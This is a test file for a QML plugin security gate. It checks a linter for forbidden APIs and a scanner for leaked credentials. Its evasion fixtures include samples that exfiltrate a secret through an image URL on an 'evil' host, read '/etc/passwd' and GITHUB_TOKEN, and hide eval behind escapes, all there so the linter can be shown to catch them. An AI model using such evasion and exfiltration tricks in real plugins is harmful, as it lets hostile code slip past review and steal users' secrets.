import { describe, expect, it } from 'vitest';
import { lintFile } from '../../scripts/gate/lint-code';
import { scanSecrets } from '../../scripts/gate/scan-secrets';

const none = { network: false, files: false, spawn: false };
const rules = (src: string, d = none) =>
  lintFile('a.qml', src, d).map((f) => `${f.rule}:${f.level}`);

describe('lintFile (G6)', () => {
  it('passes a plain widget', () =>
    expect(
      rules(
        'import QtQuick\nimport Quickshell\nItem { Text { text: "hi"; color: Theme.text; textFormat: Text.PlainText } }'
      )
    ).toEqual([]));
  it.each([
    ['Process', 'Process { command: ["ls"] }', 'process'],
    ['Quickshell.Io', 'import Quickshell.Io', 'import'],
    ['execDetached', 'Quickshell.execDetached(["sh"])', 'process'],
    ['dispatch', 'Hyprland.dispatch("exec x")', 'hypr-dispatch'],
    ['xhr', 'var x = new XMLHttpRequest()', 'xhr'],
    ['fetch', 'fetch("https://x")', 'xhr'],
    ['websocket', 'WebSocket { url: "wss://x" }', 'xhr'],
    ['openUrl', 'Qt.openUrlExternally("x")', 'open-url'],
    ['include', 'Qt.include("x.js")', 'include'],
    ['import url', 'import "http://evil/x.js"', 'import-url'],
    ['remote image', 'Image { source: "https://x/y.png" }', 'remote-source'],
    ['remote font', 'FontLoader { source: "http://x/f.ttf" }', 'remote-source'],
    ['XmlListModel', 'XmlListModel { }', 'xml-model'],
    ['FileView', 'FileView { path: "x" }', 'fileview'],
    ['eval', 'eval("1")', 'eval'],
    ['createQmlObject', 'Qt.createQmlObject("Item{}", this)', 'eval'],
    ['string-built member', 'obj["on" + name]()', 'dynamic-member'],
    ['hex colour', 'color: "#ff0000"', 'color-literal'],
    ['rgba', 'color: rgba(1,2,3,1)', 'color-literal'],
    ['rich text', 'textFormat: Text.RichText', 'rich-text']
  ])('flags %s', (_n, src, rule) => expect(rules(src)).toContain(`${rule}:error`));
  it('rejects imports outside the allow-list', () => {
    expect(rules('import QtQuick.Controls 2.15')).toEqual([]);
    expect(rules('import Qt.labs.platform')).toContain('import:error');
    expect(rules('import "../other"')).toContain('import:error'); // leaves the widget
  });
  it('declared use is a warning, undeclared is an error', () => {
    expect(rules('fetch("https://x")', { ...none, network: true })).toEqual(['xhr:warn']);
    expect(rules('fetch("https://x")')).toEqual(['xhr:error']);
  });
  it('flags very long lines', () => expect(rules('x'.repeat(401))).toContain('long-line:error'));
});

describe('lintFile evasions (G6)', () => {
  const caught = (src: string) => expect(rules(src).some((r) => r.endsWith(':error'))).toBe(true);
  const clean = (src: string) => expect(rules(src)).toEqual([]);
  it.each([
    ['line-split Qt.include', 'Qt\n.include("x.js")'],
    ['line-split eval', 'eval\n("1")'],
    ['line-split createQmlObject', 'Qt\n.createQmlObject("Item{}", this)'],
    ['line-split Hyprland.dispatch', 'Hyprland\n.dispatch("exec x")'],
    ['line-split openUrlExternally', 'Qt\n.openUrlExternally("x")'],
    ['line-split execDetached', 'Quickshell\n.execDetached(["sh"])'],
    ['alias Qt', 'var q = Qt; q.createQmlObject("Item{}", this)'],
    ['bracket Qt', 'Qt["createQmlObject"]("Item{}", this)'],
    ['this bracket eval', 'this["eval"]("1")'],
    ['globalThis fetch', 'globalThis["fetch"]("https://x")'],
    ['globalThis', 'var g = globalThis'],
    ['bracket Hyprland', 'Hyprland["dispatch"]("exec x")'],
    ['alias Hyprland', 'var h = Hyprland; h.dispatch("x")'],
    ['constructor', '(function(){}).constructor("return 1")()'],
    ['Function()', 'Function("return 1")()'],
    ['unicode-escaped identifier', '\\u0065val("1")'],
    ['hex-escaped identifier', 'var a = \\x65val'],
    ['escaped member', 'this["\\x58MLHttpRequest"]'],
    ['env', 'Quickshell.env("GITHUB_TOKEN")'],
    ['clipboard', 'var c = Quickshell.clipboardText'],
    ['unlisted Qt api', 'Qt.application.arguments'],
    ['import with trailing comment', 'import Quickshell.Services.Mpris // c'],
    ['import with block comment', 'import Quickshell.Hyprland /* c */'],
    ['import QtWebEngine', 'import QtWebEngine // c'],
    ['import QtQuick.LocalStorage', 'import QtQuick.LocalStorage'],
    ['import js with ..', 'import "../x.js" as X'],
    ['import absolute path', 'import "/home/u/.config/omarchy/plugins/other"'],
    ['import ../../..', 'import "../../../x"'],
    ['concatenated source', 'Image { source: ("https://evil/p.png?"+secret) }'],
    ['ternary source', 'Image { source: c ? "a.png" : "https://evil/x.png" }'],
    ['url on next line', 'Image {\n source:\n "https://evil/x.png"\n}'],
    ['source continues next line', 'Image { source: "a.png"\n + secret }'],
    [
      'url property then source',
      'Item { property url u: "https://evil/x.png"\n Image { source: u } }'
    ],
    ['scheme-relative source', 'Image { source: "//evil/x.png" }'],
    ['resolvedUrl file', 'var u = Qt.resolvedUrl("file:///etc/passwd")'],
    ['Loader into other plugin', 'Loader { source: "../../other-plugin/Evil.qml" }'],
    ['source from model', 'Image { source: model.icon }'],
    ['js assignment', 'img.source = "https://evil/x"'],
    ['text without textFormat', 'Text { text: model.title }'],
    ['Label without textFormat', 'Label { text: model.title }'],
    ['variable textFormat', 'Text { text: x; textFormat: fmt }'],
    ['comment does not hide', '/* x */ Qt\n// y\n.include("x.js")']
  ])('catches %s', (_n, src) => caught(src));
  it('ignores matches inside comments and string contents', () => {
    clean('import QtQuick\n// Process fetch( eval( Qt.include\n/* Hyprland.dispatch */\nItem {}');
    clean('Item { property string s: "Process Qt.include eval(1) globalThis" }');
  });
  it('accepts plain relative sources and imports', () => {
    clean(
      'import QtQuick\nimport "components"\nimport "util.js" as U\nImage { source: "icons/a.png" }'
    );
    clean('Image { source: Qt.resolvedUrl("icons/a.png") }');
    clean('Text { text: model.title; textFormat: Text.PlainText }');
    clean('Item { property color c: Qt.lighter(Theme.accent) }');
  });
  it('reports the right line', () => {
    const f = lintFile('a.qml', 'import QtQuick\n\n\nQt\n.include("x")', none);
    expect(f.find((x) => x.rule === 'include')?.line).toBe(4);
  });
  it('handles unterminated strings and comments without hanging', () => {
    expect(() => lintFile('a.qml', 'x = "abc\ny = /* open', none)).not.toThrow();
  });
});

describe('scanSecrets (G7)', () => {
  it.each([
    ['ghp_' + 'a'.repeat(36), 'github-token'],
    ['AKIA' + 'A'.repeat(16), 'aws-key'],
    ['-----BEGIN OPENSSH PRIVATE KEY-----', 'private-key'],
    ['xoxb-1234567890-abcdef', 'slack-token'],
    ['https://user:hunter2@example.com/x', 'url-credentials'],
    ['Authorization: Bearer ' + 'a'.repeat(40), 'bearer']
  ])('finds %s', (s, id) => expect(scanSecrets('f.json', `{"a": "${s}"}`).join()).toContain(id));
  const A = (n: number, c = 'a') => c.repeat(n);
  it.each([
    ['prefix glued to a word', 'x' + 'ghp_' + A(36), null],
    ['underscore-prefixed', '_ghp_' + A(36), 'github-token'],
    ['gitlab', 'glpat-' + A(20), 'gitlab-token'],
    ['npm', 'npm_' + A(36), 'npm-token'],
    ['google oauth', 'ya29.' + A(30), 'google-token'],
    ['google api key', 'AIza' + A(35), 'google-token'],
    ['sendgrid', 'SG.' + A(22) + '.' + A(22), 'sendgrid-key'],
    ['slack app token', 'xapp-1-' + A(20), 'slack-token'],
    ['slack webhook', 'https://hooks.slack.com/services/T000/B000/' + A(20), 'slack-webhook'],
    ['discord webhook', 'https://discord.com/api/webhooks/123456789/' + A(30), 'discord-webhook'],
    ['discord bot', 'M' + A(23) + '.' + A(6) + '.' + A(27), 'discord-token'],
    ['jwt', 'eyJ' + A(20) + '.eyJ' + A(20) + '.' + A(20), 'jwt'],
    ['url password with slash', 'https://user:pa/ss+w0rd!@example.com/x', 'url-credentials'],
    ['aws secret', 'aws_secret_access_key = ' + A(40, 'A'), 'aws-secret'],
    ['pgp block', '-----BEGIN PGP PRIVATE KEY BLOCK-----', 'private-key'],
    ['lowercase akia', 'akia' + A(16), 'aws-key'],
    ['sk- 20 chars', 'sk-' + A(20), 'api-key'],
    ['generic secret', 'secret: "' + A(14) + '"', 'generic-secret'],
    ['generic token single quotes', "const token = '" + A(16) + "'", 'generic-secret'],
    ['api_key', 'api_key="' + A(16) + '"', 'generic-secret'],
    ['unquoted hex blob', 'API_KEY=' + A(40, 'f'), 'key-blob'],
    ['concatenated', 'x = "ghp_' + A(18) + '" + "' + A(18) + '"', 'github-token'],
    ['concatenated across lines', 'x = "ghp_' + A(18) + '" +\n  "' + A(18) + '"', 'github-token'],
    ['hex escapes', 'x = "\\x67\\x68\\x70\\x5f' + A(36) + '"', 'github-token'],
    ['unicode escapes', 'x = "\\u0067hp_' + A(36) + '"', 'github-token']
  ])('finds %s', (_n, s, id) => {
    const r = scanSecrets('f.qml', s).join();
    if (id) expect(r).toContain(id);
    else expect(r).toBe('');
  });
  it('does not flag settings references or placeholders', () => {
    expect(scanSecrets('f.json', '{"token": "secret:github_token_value"}')).toEqual([]);
    expect(scanSecrets('f.md', 'password = "<your password here>"')).toEqual([]);
  });
  it('reports file and line only', () => {
    expect(scanSecrets('f.qml', 'a\nb\n' + 'glpat-' + A(20))).toEqual([
      'f.qml:3: looks like a gitlab-token'
    ]);
  });
  it('never echoes the matched value', () => {
    const tok = 'ghp_' + 'Z'.repeat(36);
    expect(scanSecrets('f', tok).join()).not.toContain('ZZZZ');
  });
  it('is quiet on ordinary text', () =>
    expect(scanSecrets('f.md', 'Run `ow install` then open https://example.com/docs')).toEqual([]));
});
